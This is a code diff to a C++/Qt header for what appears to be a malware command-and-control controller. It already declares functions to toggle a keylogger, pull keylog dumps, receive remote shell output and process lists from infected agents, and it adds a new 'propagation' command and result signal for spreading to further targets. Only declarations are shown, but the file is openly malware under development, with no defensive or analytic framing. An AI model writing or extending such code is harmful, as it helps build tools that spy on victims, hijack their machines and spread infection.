@@ -35,6 +35,7 @@ public:
     void toggleKeylogger(const QString& ip, bool active);
     void requestKeylogDump(const QString& ip);
     void disconnectAgent(const QString& ip);
+    void sendPropagationCommand(const QString& ip, uint8_t cmd, const QString& target);
 
     // Getters
     [[nodiscard]] bool     isRunning() const;
@@ -46,6 +47,7 @@ signals:
     void shellOutputReceived(const QString& ip, const QString& output);
     void processListReceived(const QString& ip, const QString& output);
     void keylogReceived(const QString& ip, const QString& data);
+    void propagationResultReceived(const QString& ip, const QString& result);
     void statusMessage(const QString& message);
 
 private:
